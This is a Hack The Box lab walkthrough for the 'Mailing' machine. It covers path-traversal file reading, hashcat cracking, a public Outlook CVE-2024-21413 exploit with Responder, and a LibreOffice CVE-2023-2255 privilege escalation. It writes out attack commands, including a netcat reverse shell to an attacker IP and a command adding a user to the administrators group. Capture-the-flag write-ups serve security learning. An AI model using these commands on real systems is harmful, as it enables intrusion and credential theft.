---
date: 2025-02-03
categories: [CTF, HTB]
title: "HTB - Mailing"
tags: ['hashcat', 'nmap', 'privilege escalation', 'python', 'rce', 'reverse shell', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Mailing - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Mailing

NMAP

![image1](../resources/5bca4149e3934456a5b91fa2019e67bc.png)

Add mailing.htb to /etc/hosts

- Open Burp and capture the request from Download Instructions

![image2](../resources/d1af18942afe4d62876e16ad7234fdd9.png)

- Try and get to the hosts file:

```bash
C:\Windows\System32\drivers\etc\hosts

```
**We exclude C:\\ when doing traversal:**


![image3](../resources/51d5bd364f774b6c85645caf1df37695.png)


![image4](../resources/0ad55b0725f8446f80ba0474fb2a2927.png)

- We have a LFI vulnerability

- We know that hMailServer is running and the config file for it is in:

```bash
C:\Program Files\hMailServer\Bin\hMailServer.ini

```
But that didn't work:


![image5](../resources/8274244457eb4bc58395c6bdc43e246b.png)

- We can try and do:

```bash
C:\Program Files(x86)\hMailServer\Bin\hMailServer.ini

```
And we get the config file back:


![image6](../resources/c1aba331c07043688a598f53d160e999.png)

We get hashes:

AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

\[Database\]


Password=0a9f8ad8bf896b501dde74f08efd7e4c


![image7](../resources/34bf7a31fc4a47baa6194267a2136167.png)

- Crack with hashcat:

```bash
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

```

![image8](../resources/9a73545044e64de1886f739ab6a91a3d.png)

**Administrator - homenetworkingadministrator**

- Not logon creds:

![image9](../resources/3fc853d2ea2f48a79613ac3646126f62.png)

- In order to decrypt the database password - we need to use a program specifically made for it:
<https://github.com/GitMirar/hMailDatabasePasswordDecrypter>


![image10](../resources/4b69a12112c249af97eb0d8bc9b14f29.png)

**6FC6F69152AD**

- Tried logging in through SMTP - But it didn't work:

```bash
telnet mailing.htb 25

EHLO client.net

AUTH LOGIN

<username>

<password>

```

- Log in through POP3 - worked but nothing there:

```bash
telnet mailing.htb 110

USER Administrator@mailing.htb

PASS homenetworkingadministrator

```
- If we search for Outlook vulnerabilities we come across this:
<https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability>

- Set up Responder:

```bash
Responder -I tun0
```

- And send the following crafted payload (We get the recipient name from the homepage):

```bash
python3 CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "Administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.14.15\meeting' --subject "Important"

```

![image11](../resources/664b525f935743a2a8cb850225969bed.png)

- And we get a hit:

![image12](../resources/eb85a293e71c4aa790d69ded0b1cd183.png)

- Crack with hashcat:

```bash
hashcat -a 0 -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

```

![image13](../resources/8839ade021d6402f9633465edad34d9b.png)

**maya : m4y4ngs4ri**

- The creds are good:

![image14](../resources/a1ab6d1146e3422993d26f37ad44a8e6.png)

- And we can evil-winrm in:

![image15](../resources/00726ea407744f3a9471303b1200505d.png)

```bash
evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri

```

![image16](../resources/440f58236c5d4196866c9c51cc3eda93.png)

```bash
cat user.txt

```
- Enumerating - we see a user localadmin:

![image17](../resources/543506c03d7a45618342b7b3ce72c4b5.png)

- Looking at scheduled tasks:

```bash
schtasks /query /fo LIST /v | select-string -pattern "localadmin" -context 9,13

```

![image18](../resources/917123aa2efc48abb8d1536a123d19ac.png)

We see an office script running under localadmin

- We can also see that LibreOffice is installed:

![image19](../resources/205b31e287e1480d9ce4d4744a189648.png)

- Get LibreOffice version:

```powershell
$libreofficeInstallPath = "C:\Program Files\LibreOffice"
$libreofficeVersion = (Get-Item "$libreofficeInstallPath\program\soffice.bin").VersionInfo.FileVersion
Write-Host "LibreOffice Version: $libreofficeVersion"

```

![image20](../resources/ff35adbdc84e45cbb48a93b1327fb5d7.png)

- **CVE-2023-2255:**

![image21](../resources/ced8b388e3ec49ea905a09a30b580a56.png)

- Test the exploit:
<https://github.com/elweth-sec/CVE-2023-2255/blob/main/CVE-2023-2255.py>

```bash
python3 CVE-2023-2255.py --cmd "curl <http://10.10.14.15:8000/a>" --output form.odt

```
- Upload the form.odt to C:\Important Documents

![image22](../resources/990308e37f5c4afe8e268b30cc25d00b.png)

- Set up python http server to test:

![image23](../resources/1d34f984e26746dc8c4e10bce2faa711.png)

- Uploading nc and trying to get a reverse shell didn't work because of AV:

```bash
python3 CVE-2023-2255.py --cmd "C:\Important Documents\nc.exe 10.10.14.15 8000 -e cmd.exe" --output form.odt

```
- So instead added maya to admin group:

```bash
python3 CVE-2023-2255.py --cmd "net localgroup Administradores /add maya" --output form.odt

```

![image24](../resources/7526f6a5f87c4deda29fe2977ae3a478.png)

- Close the current evil-winrm session and start a new session (otherwise the new group won't take effect)

```bash
cat root.txt

```
- We can also dump the SAM hashes now